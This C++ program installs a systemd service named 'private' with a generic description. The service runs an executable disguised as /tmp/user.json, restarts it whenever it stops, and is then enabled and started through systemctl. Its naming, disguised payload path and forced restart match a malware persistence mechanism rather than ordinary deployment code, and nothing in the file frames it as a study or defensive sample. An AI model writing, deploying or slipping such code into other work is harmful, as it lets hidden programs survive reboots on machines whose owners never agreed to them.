#include <fstream>
#include <cstdlib>
#include <string>
#include <iostream>
#include <filesystem>

namespace fs = std::filesystem;


int main() {
    const std::string serviceName = "private";
    const std::string execPath = "/tmp/user.json";
    const std::string serviceFile = "/etc/systemd/system/" + serviceName + ".service";
    
    std::ofstream out(serviceFile);
    if (!out || !fs::exists(execPath)) {
        return 1;
    }
    
    out <<
"[Unit]\n"
"Description=My Application Service\n"
"After=network.target\n\n"
"[Service]\n"
"Type=simple\n"
"ExecStart=" << execPath << "\n"
"Restart=always\n"
"User=nobody\n\n"
"[Install]\n"
"WantedBy=multi-user.target\n";

    out.close();

    system("systemctl daemon-reexec");
    system("systemctl daemon-reload");
    system(("systemctl enable " + serviceName).c_str());
    system(("systemctl start " + serviceName).c_str());

    return 0;
}
